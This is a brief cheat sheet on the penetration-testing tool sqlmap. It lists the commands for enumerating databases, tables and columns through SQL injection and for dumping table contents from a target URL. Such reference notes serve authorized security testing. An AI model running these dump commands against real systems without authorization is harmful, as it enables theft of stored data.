# sqlmap

#### `sqlmap` is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.

## Usage

Step 1: Find Databases
```
sqlmap -u URL --dbs 
```

Step 2: Find Tables in the Database
```
sqlmap -u URL -D <database> --tables
```

Step 3: Find Columns inside the Table (Optional)
```
sqlmap -u URL -D <database> -T <table> --columns
```

Step 4: Dump Database Tables (i.e. get the database entries)
```
sqlmap -u URL -D <database> -T <table> --dump
```
<b>OR</b>
```
sqlmap -u URL -D <database> -T <table> -C <column> --dump
```
(when you want to retrieve data in a specific column)
